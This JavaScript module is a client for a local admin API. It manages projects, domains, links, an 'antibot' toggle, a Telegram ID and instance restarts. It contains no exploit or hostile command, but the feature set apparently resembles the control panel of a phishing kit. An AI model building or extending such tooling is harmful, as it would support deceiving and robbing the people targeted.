const superagent = require('superagent')

const APP_URL = `http://127.0.0.1:${process.env.HOST_PORT}/${process.env.SITE_AUTH}`


const doRestartAfterChange = () => {
    superagent.post(`${APP_URL}/handler/instance/state`)
    .send({ state: 'RESTART' })
    .end((err, resp) => {
        if (err) {
            console.error(err)
        }
    })
}

exports.getProjects = (cBack) => {
    superagent.get(`${APP_URL}/handler/projects`)
        .end((err, resp) => {
            if (err) {
                return cBack(false, `Failed to execute command, error: ${err}`)
            }

            if (resp.body.code === 0) {
                return cBack(true,  resp.body.info)
            } else {
                return cBack(false, resp.body.message)
            }
                    
        })
}

exports.getActiveProject = (cBack) => {
    superagent.get(`${APP_URL}/handler/projects/active`)
    .end((err, resp) => {
        if (err) {
            return cBack(false, `Failed to execute command, error: ${err}`)
        }

        if (resp.body.code === 0) {
            return cBack(true, resp.body.info)
        } else {
            return cBack(false, resp.body.message)
        }
                
    })
}

exports.getInformation = (cBack) => {
    superagent.get(`${APP_URL}/handler/projects`)
    .end((err, resp) => {
        if (err) {
            return cBack(false, `Failed to execute command, error: ${err}`)
        }

        if (resp.body.code === 0) {
            return cBack(true, resp.body.info)
        } else {
            return cBack(false, resp.body.message)
        }
                
    })
}

exports.getDomains = (cBack) => {
    superagent.get(`${APP_URL}/handler/domains`)
    .end((err, resp) => {
        if (err) {
            return cBack(false, `Failed to execute command, error: ${err}`)
        }
        if (resp.body.code === 0) {
            return cBack(true, resp.body.info)
        } else {
            return cBack(false, resp.body.message)
        }
                
    })
}

exports.getLinks = (cBack) => {
    superagent.get(`${APP_URL}/handler/links`)
    .end((err, resp) => {
        if (err) {
            return cBack(false, `Failed to execute command, error: ${err}`)
        }

        if (resp.body.code === 0) {
            return cBack(true, resp.body.info)
        } else {
            return cBack(false, resp.body.message)
        }
                
    })
}


exports.addDomain = (domainName, cBack) => {
    superagent.post(`${APP_URL}/handler/domains/add`)
    .send({ domain: domainName })
    .end((err, resp) => {
        if (err) {
            return cBack(false, `Failed to execute command, error: ${err}`)
        }

        if (resp.body.code === 0) {
            doRestartAfterChange()
            return cBack(true, resp.body.info)
        } else {
            return cBack(false, resp.body.message)
        }
                
    })

}

exports.deleteDomain = (domainName, cBack) => {
    superagent.post(`${APP_URL}/handler/domains/delete`)
    .send({ domain: domainName })
    .end((err, resp) => {
        if (err) {
            return cBack(false, `Failed to execute command, error: ${err}`)
        }

        if (resp.body.code === 0) {
            doRestartAfterChange()
            return cBack(true, resp.body.info)
        } else {
            return cBack(false, resp.body.message)
        }
                
    })
}

exports.switchAntibot = (antibotSwitch, antibotInfo, cBack) => {
    superagent.post(`${APP_URL}/handler/antibot/switch`)
    .send({ antibot: antibotSwitch, antibotInfo: antibotInfo })
    .end((err, resp) => {
        if (err) {
            return cBack(false, `Failed to execute command, error: ${err}`)
        }

        if (resp.body.code === 0) {
            doRestartAfterChange()
            return cBack(true, resp.body.info)
        } else {
            return cBack(false, resp.body.message)
        }
                
    })
}

exports.setTelegramID = (telegramInfo, cBack) => {
    superagent.post(`${APP_URL}/handler/telegram`)
    .send({ telegramID:telegramInfo })
    .end((err, resp) => {
        if (err) {
            return cBack(false, `Failed to execute command, error: ${err}`)
        }

        if (resp.body.code === 0) {
            doRestartAfterChange()
            return cBack(true, resp.body.info)
        } else {
            return cBack(false, resp.body.message)
        }
                
    })
}



exports.changeProject = (projectName, cBack) => {
    superagent.post(`${APP_URL}/handler/projects/change`)
    .send({ project: projectName })
    .end((err, resp) => {
        if (err) {
            return cBack(false, `Failed to execute command, error: ${err}`)
        }

        if (resp.body.code === 0) {
            doRestartAfterChange()
            return cBack(true, resp.body.info)
        } else {
            return cBack(false, resp.body.message)
        }
                
    })
}

exports.changeState = (newState, cBack) => {
    superagent.post(`${APP_URL}/handler/instance/state`)
    .send({ state: newState })
    .end((err, resp) => {
        if (err) {
            return cBack(false, `Failed to execute command, error: ${err}`)
        }

        if (resp.body.code === 0) {
            return cBack(true, resp.body.info)
        } else {
            return cBack(false, resp.body.message)
        }
                
    })
}


